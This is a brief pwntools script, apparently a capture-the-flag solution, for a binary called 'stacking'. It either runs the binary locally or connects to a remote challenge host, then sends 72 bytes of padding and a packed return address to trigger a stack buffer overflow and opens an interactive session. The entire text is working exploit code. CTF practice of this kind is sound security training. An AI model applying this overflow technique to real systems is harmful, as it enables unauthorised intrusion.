from pwn import * 

def conn():
    if args.REMOTE:
        return remote('nc.umbccd.net', 8921)
    else:
        return process('./stacking')
def main():
    io = conn()
    io.send(b"A"*72 + p64(0x4011a6))
    io.interactive()
if __name__ == "__main__":
    main()